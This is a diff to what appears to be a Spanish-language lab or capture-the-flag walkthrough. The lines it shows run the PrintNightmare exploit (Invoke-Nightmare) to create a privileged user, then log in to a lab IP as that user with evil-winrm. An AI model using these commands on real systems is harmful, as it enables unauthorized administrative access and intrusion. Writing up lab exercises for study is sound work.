@@ -99,7 +99,10 @@ Y despues lo ejecutamos
 Invoke-Nightmare -DriverName "Xerox" -NewUser "jaime" -NewPassword "123456"
 ```
 
-Habiendose
+Habiéndose creado un nuevo usuario privilegiado pudiendo acceder con [[EVIL-WINRM]]
+```shell
+evil-winrm -i 10.129.9.43 -u 'jaime' -p '123456'
+```
 
 
 
